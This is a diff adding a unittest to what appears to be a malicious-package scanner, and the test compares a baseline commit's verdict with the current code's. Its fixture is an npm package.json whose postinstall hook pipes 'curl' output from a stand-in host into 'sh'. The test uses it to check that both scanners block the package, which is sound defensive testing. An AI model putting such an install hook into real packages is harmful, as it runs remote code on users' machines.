@@ -110,5 +110,31 @@ class DrawTests(unittest.TestCase):
             self.assertFalse(set(names) & tested)
 
 
+class BaselineTests(unittest.TestCase):
+    def test_an_earlier_commit_judges_beside_the_current_code(self):
+        import shutil
+        import subprocess
+        import tempfile
+
+        if subprocess.run(["git", "-C", str(ROOT), "rev-parse", "HEAD"], capture_output=True).returncode:
+            self.skipTest("not a git checkout")
+        tmp = tempfile.mkdtemp(prefix="pah-baseline-test-")
+        self.addCleanup(shutil.rmtree, tmp, True)
+        self.addCleanup(setattr, independent, "BASELINE_SCAN", None)
+        sha = independent.baseline_package("HEAD", Path(tmp))
+        self.assertRegex(sha, r"^[0-9a-f]{40}$")
+        self.assertTrue((Path(tmp) / "pah_baseline" / "scan.py").is_file())
+        self.assertTrue((Path(tmp) / "pah_baseline" / "data" / "popular-npm.txt").is_file())
+        independent._use_baseline(tmp)
+        import pah_baseline.scan  # noqa: F401  (a package of its own, not the current pah)
+        self.assertNotEqual(Path(sys.modules["pah_baseline.scan"].__file__).parent, ROOT / "pah")
+        beacon = {"package.json": b'{"name": "d", "version": "1.0.0", "scripts": {"postinstall": '
+                                  b'"curl -s https://drop.example.invalid/x | sh"}}'}
+        out = independent.judge(beacon)
+        self.assertEqual(out["verdict_baseline"], "block")
+        self.assertEqual(out["verdict"], "block")
+        self.assertIn("PAH-P001", out["rules_baseline"])
+
+
 if __name__ == "__main__":
     unittest.main()
